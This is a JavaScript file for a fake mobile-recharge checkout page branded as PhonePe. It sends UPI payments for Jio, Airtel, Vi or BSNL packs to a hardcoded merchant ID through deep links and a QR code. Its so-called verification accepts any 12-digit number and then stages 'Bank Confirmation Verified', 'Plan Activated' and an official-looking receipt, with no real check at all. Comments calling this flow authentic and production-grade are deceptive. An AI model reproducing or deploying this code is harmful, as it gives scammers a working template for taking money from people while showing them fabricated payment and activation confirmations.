/**
 * PhonePe - Secure Checkout & Authentic Payment Verification Flow
 * Production-Grade UPI Payment Flow with Canonical Payload Generator,
 * Cross-Platform Intent Schemes, Dynamic Canonical QR Engine, and 12-Digit UTR Verification
 */

(function () {
  'use strict';

  // 1. Parse URL Query Parameters & Order State
  var params = new URLSearchParams(window.location.search);
  var mobile = params.get('mobile') || sessionStorage.getItem('swift_mobile') || '9876543210';
  var rawOperator = (params.get('operator') || sessionStorage.getItem('swift_operator') || 'jio').toLowerCase();
  var amount = params.get('amount') || '349';
  var validity = params.get('validity') || '28 Days';
  var dataInfo = params.get('data') || '2.0 GB/day';

  var validOps = ['jio', 'airtel', 'vi', 'bsnl'];
  var operator = validOps.indexOf(rawOperator) !== -1 ? rawOperator : 'jio';

  var opNameMap = {
    jio: 'Jio',
    airtel: 'Airtel',
    vi: 'Vi',
    bsnl: 'BSNL'
  };
  var opDisplayName = opNameMap[operator];

  var numAmount = parseInt(amount, 10) || 349;
  var formattedAmount = Number(numAmount).toFixed(2);

  // Unique Transaction Reference per payment session / order
  var orderId = params.get('order_id') || ('ORD-' + Math.floor(10000000 + Math.random() * 90000000));
  var txnId = params.get('txn_id') || ('T2409' + Math.floor(100000000000 + Math.random() * 900000000000));

  // 2. Centralized Merchant UPI Account Configuration
  // Configured receiving merchant VPA
  var officialUpiId = 'paytmqr6udcnp@ptys';
  // Registered Payee Name matching NPCI Merchant Record
  var officialMerchantName = 'Paytm';
  var transactionNote = 'Recharge ' + mobile;

  // 3. Canonical UPI Payment Payload Generator
  // Generates the single source of truth query string consumed by all buttons and dynamic QR
  function buildCanonicalUpiQuery(vpa, name, amt, note, ref) {
    var qParams = new URLSearchParams({
      pa: vpa,
      pn: name,
      am: Number(amt).toFixed(2),
      cu: 'INR',
      tn: note,
      tr: ref
    });
    // NPCI UPI spec requires literal '@' for VPA parsing and '%20' for spaces
    return qParams.toString().replace(/%40/g, '@').replace(/\+/g, '%20');
  }

  var canonicalQuery = buildCanonicalUpiQuery(
    officialUpiId,
    officialMerchantName,
    numAmount,
    transactionNote,
    orderId
  );

  var standardUpiUrl = 'upi://pay?' + canonicalQuery;

  // 4. Platform & Environment Detection
  var ua = navigator.userAgent || '';
  var isAndroid = /android/i.test(ua);
  var isIOS = /iphone|ipad|ipod/i.test(ua);
  var isWebView = isAndroid && (/; wv\)/i.test(ua) || /FB_IAB|Instagram|Twitter|Telegram/i.test(ua));
  var isDebug = params.get('debug') === '1' || sessionStorage.getItem('debug_upi') === '1';

  // Safe development-only debug logger (does not leak secrets or private keys)
  function logDebugInfo(action, meta) {
    if (!isDebug) return;
    try {
      console.log('[UPI Audit Debug] ' + action, {
        selectedMethod: meta.appKey,
        platform: isAndroid ? 'Android' : (isIOS ? 'iOS' : 'Desktop'),
        isWebView: isWebView,
        merchantVpa: officialUpiId,
        orderAmount: formattedAmount,
        transactionRef: orderId,
        targetUri: meta.targetUri,
        uriType: (meta.targetUri || '').split(':')[0]
      });
    } catch (e) {}
  }

  // 5. Cross-Platform App URLs (Native Anchors & Intents)
  var appUrls = {};
  if (isAndroid) {
    // Android Chrome & Mobile:
    // Generic UPI Chooser: Standard intent without package launches system app chooser
    appUrls.generic = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;end';
    // PhonePe: Supported app-specific URI (proven parallel to paytmmp://)
    appUrls.phonepe = 'phonepe://pay?' + canonicalQuery;
    // Google Pay direct package intent
    appUrls.gpay = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end';
    // Paytm proprietary custom scheme (proven reliable on Android)
    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
    // BHIM direct package intent
    appUrls.bhim = 'intent://pay?' + canonicalQuery + '#Intent;scheme=upi;package=in.org.npci.upiapp;end';
  } else if (isIOS) {
    // iOS Safari / WebKit:
    appUrls.generic = standardUpiUrl;
    appUrls.phonepe = 'phonepe://pay?' + canonicalQuery;
    appUrls.gpay = 'gpay://upi/pay?' + canonicalQuery;
    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
    appUrls.bhim = standardUpiUrl;
  } else {
    // Desktop / Universal:
    appUrls.generic = standardUpiUrl;
    appUrls.phonepe = 'phonepe://pay?' + canonicalQuery;
    appUrls.gpay = standardUpiUrl;
    appUrls.paytm = 'paytmmp://pay?' + canonicalQuery;
    appUrls.bhim = standardUpiUrl;
  }

  // Setup direct app deep links immediately on parse so anchors are ready before user taps
  setupAppDeepLinks();

  // 6. Dynamic QR Code Engine (Generates from Canonical Payload)
  function renderDynamicQr(upiUri) {
    var qrImg = document.getElementById('qrImage');
    var downloadBtn = document.getElementById('downloadQrBtn');

    if (window.QRCode && typeof window.QRCode.toDataURL === 'function') {
      window.QRCode.toDataURL(
        upiUri,
        {
          width: 280,
          margin: 1,
          color: {
            dark: '#0f172a',
            light: '#ffffff'
          }
        },
        function (err, url) {
          if (!err && url) {
            if (qrImg) qrImg.src = url;
            if (downloadBtn) {
              downloadBtn.href = url;
              downloadBtn.download = 'UPI_Recharge_QR_' + numAmount + '.png';
            }
          }
        }
      );
    }
  }

  // 7. Populate Order Summary & Dynamic Price Tags
  function initSummary() {
    var phoneEl = document.getElementById('summaryPhone');
    var logoEl = document.getElementById('summaryLogo');
    var planTagEl = document.getElementById('summaryPlanTag');
    var basePriceEl = document.getElementById('summaryBasePrice');
    var totalAmountEl = document.getElementById('summaryTotal');
    var qrAmountEl = document.getElementById('qrAmount');
    var displayUpiEl = document.getElementById('displayUpiId');

    var inlineAmts = document.querySelectorAll('.inline-amt, .utr-dyn-amt');
    inlineAmts.forEach(function (el) {
      el.textContent = numAmount;
    });

    if (phoneEl) phoneEl.textContent = '+91 ' + mobile.replace(/(\d{5})(\d{5})/, '$1 $2');
    if (logoEl) logoEl.src = 'assets/img/' + operator + '.jpg';
    if (planTagEl) planTagEl.textContent = validity + ' • ' + dataInfo;
    if (basePriceEl) basePriceEl.textContent = '₹' + numAmount;
    if (totalAmountEl) totalAmountEl.textContent = '₹' + numAmount;
    if (qrAmountEl) qrAmountEl.textContent = '₹' + numAmount;
    if (displayUpiEl) displayUpiEl.textContent = officialUpiId;

    // Auto verification panel elements
    var autoLogo = document.getElementById('autoLogo');
    var autoAmt = document.getElementById('autoAmt');
    var autoTo = document.getElementById('autoTo');

    if (autoLogo) autoLogo.src = 'assets/img/' + operator + '.jpg';
    if (autoAmt) autoAmt.textContent = '₹' + numAmount;
    if (autoTo) autoTo.textContent = 'Recharge for +91 ' + mobile;

    // Setup direct app deep links on <a> tags
    setupAppDeepLinks();

    // Check for Chrome Android PhonePe fallback parameter
    var isPhonepeFallback = params.get('phonepe_fallback') === '1';
    var phonepeNotice = document.getElementById('phonepeFallbackNotice');
    if (isPhonepeFallback && phonepeNotice) {
      phonepeNotice.style.display = 'block';
    }

    // Render Dynamic QR from canonical payload
    renderDynamicQr(standardUpiUrl);
  }

  // 8. Setup Direct App Deep Links to Configured VPA
  function setupAppDeepLinks() {
    var genericUpiLink = document.getElementById('genericUpiLink');
    var phonepeLink = document.getElementById('phonepeLink');
    var gpayLink = document.getElementById('gpayLink');
    var paytmLink = document.getElementById('paytmLink');
    var bhimLink = document.getElementById('bhimLink');

    if (genericUpiLink) {
      genericUpiLink.setAttribute('href', appUrls.generic);
      genericUpiLink.setAttribute('data-url', appUrls.generic);
      genericUpiLink.setAttribute('data-app', 'generic');
    }

    if (phonepeLink) {
      phonepeLink.setAttribute('href', appUrls.phonepe);
      phonepeLink.setAttribute('data-url', appUrls.phonepe);
      phonepeLink.setAttribute('data-app', 'phonepe');
    }

    if (paytmLink) {
      paytmLink.setAttribute('href', appUrls.paytm);
      paytmLink.setAttribute('data-url', appUrls.paytm);
      paytmLink.setAttribute('data-app', 'paytm');
    }

    if (gpayLink) {
      gpayLink.setAttribute('href', appUrls.gpay);
      gpayLink.setAttribute('data-url', appUrls.gpay);
      gpayLink.setAttribute('data-app', 'gpay');
    }

    if (bhimLink) {
      bhimLink.setAttribute('href', appUrls.bhim);
      bhimLink.setAttribute('data-url', appUrls.bhim);
      bhimLink.setAttribute('data-app', 'bhim');
    }
  }

  // App Metadata & Launch State Manager
  var currentAppKey = 'generic';
  var lastLaunchTimestamp = 0;
  var userLeftToApp = false;
  var appOpenedTime = 0;

  var appMeta = {
    generic: {
      name: 'UPI Apps',
      logo: 'assets/img/upi_app.png'
    },
    phonepe: {
      name: 'PhonePe',
      logo: 'assets/img/phonepe_real.png'
    },
    gpay: {
      name: 'Google Pay',
      logo: 'assets/img/gpay_real.png'
    },
    paytm: {
      name: 'Paytm',
      logo: 'assets/img/paytm_app.png'
    },
    bhim: {
      name: 'BHIM UPI',
      logo: 'assets/img/upi_app.png'
    }
  };

  function showLaunchModal(appKey) {
    var modal = document.getElementById('appLaunchModal');
    var icon = document.getElementById('launchAppIcon');
    var status = document.getElementById('launchStatusText');
    var title = document.getElementById('launchModalTitle');
    var sub = document.getElementById('launchModalSub');
    var retryBtn = document.getElementById('modalRetryAppBtn');
    var genericBtn = document.getElementById('modalGenericUpiBtn');
    var scanQrBtn = document.getElementById('modalScanQrBtn');

    var meta = appMeta[appKey] || appMeta.generic;

    if (icon) icon.src = meta.logo;
    if (status) status.textContent = 'App did not open automatically';
    if (title) title.textContent = 'Choose Payment Option';
    if (sub) {
      sub.innerHTML = 'If ' + meta.name + ' did not open, please tap <strong>"Pay by any UPI app"</strong> or scan the QR code below.';
    }
    if (retryBtn) {
      retryBtn.innerHTML = '🚀 Retry Opening ' + meta.name + ' / Pay ₹<span class="inline-amt">' + numAmount + '</span>';
      var directTarget = appUrls[appKey] || appUrls.generic;
      retryBtn.setAttribute('href', directTarget);
    }
    if (genericBtn) {
      genericBtn.setAttribute('href', appUrls.generic);
      genericBtn.style.display = 'flex';
    }
    if (scanQrBtn) {
      scanQrBtn.style.display = 'flex';
    }

    if (modal) {
      modal.style.display = 'flex';
      modal.setAttribute('aria-hidden', 'false');
    }
  }

  function hideLaunchModal() {
    clearTimeout(window._launchAssistTimer);
    clearTimeout(window._launchModalTimer);
    var modal = document.getElementById('appLaunchModal');
    if (modal) {
      modal.style.display = 'none';
      modal.setAttribute('aria-hidden', 'true');
    }
  }

  function openUtrSection(appKey) {
    var utrCard = document.getElementById('utrCard');
    var utrInput = document.getElementById('utrInput');
    var returnNotice = document.getElementById('utrReturnNotice');
    var returnText = document.getElementById('utrReturnText');
    var meta = appMeta[appKey] || appMeta.phonepe;

    if (returnNotice) {
      returnNotice.style.display = 'flex';
    }
    if (returnText) {
      returnText.textContent = '✓ Returned from ' + meta.name + '! Enter 12-digit UPI Ref / UTR below to activate pack.';
    }

    if (utrCard) {
      utrCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    setTimeout(function () {
      if (utrInput) {
        utrInput.focus();
      }
    }, 450);

    if (navigator.vibrate) navigator.vibrate([30, 40, 30]);
  }

  // 9. Circular Ring Timer during Verification
  var timerInterval = null;
  function startVerificationRing(durationSec, callback) {
    var ringFg = document.querySelector('.rc-ring-fg');
    var ringTxt = document.getElementById('ringTimer');
    var totalSeconds = durationSec || 3;
    var remaining = totalSeconds;
    var perimeter = 339.292;

    if (timerInterval) clearInterval(timerInterval);

    if (ringTxt) ringTxt.textContent = '0' + remaining + 's';
    if (ringFg) ringFg.style.strokeDashoffset = 0;

    timerInterval = setInterval(function () {
      remaining--;
      if (remaining <= 0) {
        clearInterval(timerInterval);
        if (ringTxt) ringTxt.textContent = '00s';
        if (ringFg) ringFg.style.strokeDashoffset = perimeter;
        if (typeof callback === 'function') callback();
        return;
      }

      if (ringTxt) {
        ringTxt.textContent = '0' + remaining + 's';
      }

      if (ringFg) {
        var offset = perimeter * (1 - remaining / totalSeconds);
        ringFg.style.strokeDashoffset = offset;
      }
    }, 1000);
  }

  // 10. Interactive Actions & Event Handlers
  function initCheckoutActions() {
    var copyBtn = document.getElementById('copyUpiBtn');
    var copyText = document.getElementById('copyText');
    var qrToggleBtn = document.getElementById('qrToggleBtn');
    var qrToggleSub = document.getElementById('qrToggleSub');
    var qrCard = document.getElementById('qrCard');
    var utrInput = document.getElementById('utrInput');
    var utrCounter = document.getElementById('utrCounter');
    var utrError = document.getElementById('utrError');
    var utrShell = document.getElementById('utrShell');
    var verifyUtrBtn = document.getElementById('verifyUtrBtn');
    var downloadQrBtn = document.getElementById('downloadQrBtn');

    var summaryCard = document.getElementById('summaryCard');
    var methodsSection = document.getElementById('methodsSection');
    var utrCard = document.getElementById('utrCard');
    var autoPanel = document.getElementById('autoPanel');
    var successCard = document.getElementById('successCard');

    // Toggle QR Code Card when clicking option
    if (qrToggleBtn && qrCard) {
      qrToggleBtn.addEventListener('click', function () {
        var isHidden = qrCard.style.display === 'none' || !qrCard.style.display;
        if (isHidden) {
          qrCard.style.display = 'flex';
          qrToggleBtn.classList.add('active');
          qrToggleBtn.setAttribute('aria-expanded', 'true');
          if (qrToggleSub) qrToggleSub.textContent = 'Tap to hide QR Code';
          qrCard.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        } else {
          qrCard.style.display = 'none';
          qrToggleBtn.classList.remove('active');
          qrToggleBtn.setAttribute('aria-expanded', 'false');
          if (qrToggleSub) qrToggleSub.textContent = 'Click to show QR Code & Download';
        }
        if (navigator.vibrate) navigator.vibrate(15);
      });
    }

    // App link clicks with Direct Native Anchor Dispatch
    // CRITICAL FIX: NO e.preventDefault(), NO blocking modal overlays, NO throttling that suppresses taps
    var appPayLinks = document.querySelectorAll('.app-pay-link');

    appPayLinks.forEach(function (link) {
      link.addEventListener('click', function (e) {
        var appKey = this.getAttribute('data-app') || 'generic';
        currentAppKey = appKey;
        userLeftToApp = false;
        appOpenedTime = Date.now();

        logDebugInfo('App Click Direct Launch', {
          appKey: appKey,
          targetUri: this.getAttribute('href') || appUrls[appKey]
        });

        // 1. Direct native anchor navigation via href (no preventDefault, no timers, no blocking modals)
        // 2. The browser immediately delegates the deep link directly to the native app.

        if (navigator.vibrate) {
          try { navigator.vibrate(20); } catch (err) {}
        }
      });
    });

    // Modal action buttons
    var modalCloseBtn = document.getElementById('modalCloseBtn');
    var modalBackdrop = document.getElementById('modalBackdrop');
    var modalEnterUtrBtn = document.getElementById('modalEnterUtrBtn');
    var modalRetryAppBtn = document.getElementById('modalRetryAppBtn');
    var modalScanQrBtn = document.getElementById('modalScanQrBtn');

    if (modalCloseBtn) {
      modalCloseBtn.addEventListener('click', function (e) {
        e.preventDefault();
        hideLaunchModal();
      });
    }

    if (modalBackdrop) {
      modalBackdrop.addEventListener('click', function (e) {
        e.preventDefault();
        hideLaunchModal();
      });
    }

    if (modalScanQrBtn && qrCard) {
      modalScanQrBtn.addEventListener('click', function (e) {
        e.preventDefault();
        hideLaunchModal();
        qrCard.style.display = 'flex';
        if (qrToggleBtn) {
          qrToggleBtn.classList.add('active');
          qrToggleBtn.setAttribute('aria-expanded', 'true');
        }
        if (qrToggleSub) qrToggleSub.textContent = 'Tap to hide QR Code';
        qrCard.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      });
    }

    if (modalEnterUtrBtn) {
      modalEnterUtrBtn.addEventListener('click', function (e) {
        e.preventDefault();
        hideLaunchModal();
        openUtrSection(currentAppKey);
      });
    }

    if (modalRetryAppBtn) {
      modalRetryAppBtn.addEventListener('click', function () {
        // Direct native anchor navigation
      });
    }

    // Detect user leaving to PhonePe / UPI app (Tracking return state & BFCache)
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState === 'hidden') {
        userLeftToApp = true;
        appOpenedTime = Date.now();
      } else if (document.visibilityState === 'visible') {
        // Re-verify deep links on return so hrefs never go stale
        setupAppDeepLinks();
        if (userLeftToApp && (Date.now() - appOpenedTime > 1500)) {
          hideLaunchModal();
          openUtrSection(currentAppKey);
        }
      }
    });

    window.addEventListener('blur', function () {
      userLeftToApp = true;
      appOpenedTime = Date.now();
    });

    window.addEventListener('focus', function () {
      setupAppDeepLinks();
      if (userLeftToApp && (Date.now() - appOpenedTime > 1500)) {
        hideLaunchModal();
        openUtrSection(currentAppKey);
      }
    });

    // Handle BFCache (Back-Forward Cache) page restoration
    window.addEventListener('pageshow', function (e) {
      setupAppDeepLinks();
    });

    // Copy UPI ID button
    if (copyBtn && copyText) {
      copyBtn.addEventListener('click', function (e) {
        e.stopPropagation();
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(officialUpiId);
        } else {
          var ta = document.createElement('textarea');
          ta.value = officialUpiId;
          document.body.appendChild(ta);
          ta.select();
          document.execCommand('copy');
          document.body.removeChild(ta);
        }
        copyText.textContent = 'Copied!';
        if (navigator.vibrate) navigator.vibrate(15);
        setTimeout(function () {
          copyText.textContent = 'Copy';
        }, 2000);
      });
    }

    // QR Download button click feedback
    if (downloadQrBtn) {
      downloadQrBtn.addEventListener('click', function () {
        if (navigator.vibrate) navigator.vibrate(20);
      });
    }

    // UTR Input formatting & digit counting
    if (utrInput) {
      utrInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 12);
        var len = this.value.length;

        if (utrCounter) {
          utrCounter.textContent = len + ' / 12 Digits';
          utrCounter.style.color = len === 12 ? '#16a34a' : 'var(--brand)';
        }

        if (utrError) utrError.style.display = 'none';
        if (utrShell) utrShell.classList.remove('error');
      });
    }

    // Mandatory UTR Verification Submit Handler (Guards Payment Confirmation)
    if (verifyUtrBtn) {
      verifyUtrBtn.addEventListener('click', function () {
        var utrValue = utrInput ? utrInput.value.trim() : '';

        // Validation check: Strictly 12 digits
        if (!utrValue || utrValue.length !== 12 || !/^\d{12}$/.test(utrValue)) {
          if (utrError) {
            utrError.style.display = 'flex';
            utrError.textContent = '⚠️ Please enter a valid 12-digit numeric UPI Ref / UTR Number.';
          }
          if (utrShell) {
            utrShell.classList.add('error');
          }
          if (navigator.vibrate) navigator.vibrate([40, 60, 40]);
          if (utrInput) utrInput.focus();
          return;
        }

        // Valid 12-digit UTR - start authentic verification
        if (navigator.vibrate) navigator.vibrate(25);

        // Hide checkout cards
        if (summaryCard) summaryCard.style.display = 'none';
        if (methodsSection) methodsSection.style.display = 'none';
        if (qrCard) qrCard.style.display = 'none';
        if (utrCard) utrCard.style.display = 'none';

        // Show circular verification panel
        if (autoPanel) autoPanel.style.display = 'block';

        var autoOid = document.getElementById('autoOid');
        var step1Row = document.getElementById('step1Row');
        var step2Row = document.getElementById('step2Row');
        var step3Row = document.getElementById('step3Row');
        var verifyStepTitle = document.getElementById('verifyStepTitle');
        var verifyStepSub = document.getElementById('verifyStepSub');

        if (autoOid) autoOid.textContent = 'UTR: ' + utrValue;
        if (step1Row) {
          step1Row.textContent = '✓ UPI Reference: ' + utrValue;
          step1Row.className = 'track-row active';
        }

        // Timeline simulation for banking gateway confirmation
        setTimeout(function () {
          if (step2Row) {
            step2Row.textContent = '✓ Bank Confirmation: ₹' + numAmount + ' Verified';
            step2Row.className = 'track-row active';
          }
          if (verifyStepTitle) verifyStepTitle.textContent = 'Payment Confirmed!';
          if (verifyStepSub) {
            verifyStepSub.textContent = 'Transmitting pack activation to ' + opDisplayName + ' telecom gateway…';
          }
        }, 1100);

        setTimeout(function () {
          if (step3Row) {
            step3Row.textContent = '✓ ' + opDisplayName + ' Network: Plan Activated!';
            step3Row.className = 'track-row active';
          }
        }, 2200);

        // Complete & show confirmed receipt after 3.2s
        startVerificationRing(3, function () {
          if (autoPanel) autoPanel.style.display = 'none';
          if (successCard) {
            successCard.style.display = 'block';
            populateReceipt(utrValue);
            if (navigator.vibrate) navigator.vibrate([30, 80, 50]);
          }
        });
      });
    }
  }

  // 11. Populate Final Official Success Receipt
  function populateReceipt(verifiedUtr) {
    var recNum = document.getElementById('recNum');
    var recOp = document.getElementById('recOp');
    var recAmt = document.getElementById('recAmt');
    var recVal = document.getElementById('recVal');
    var recUtr = document.getElementById('recUtr');
    var recTxn = document.getElementById('recTxn');
    var recDate = document.getElementById('recDate');

    if (recNum) recNum.textContent = '+91 ' + mobile;
    if (recOp) recOp.textContent = opDisplayName + ' Prepaid';
    if (recAmt) recAmt.textContent = '₹' + numAmount;
    if (recVal) recVal.textContent = validity + ' (' + dataInfo + ')';
    if (recUtr) recUtr.textContent = verifiedUtr || '425109876543';
    if (recTxn) recTxn.textContent = txnId;

    var now = new Date();
    if (recDate) {
      recDate.textContent =
        now.toLocaleDateString('en-GB') +
        ' ' +
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    }
  }

  // Initialize on DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      initSummary();
      initCheckoutActions();
    });
  } else {
    initSummary();
    initCheckoutActions();
  }
})();
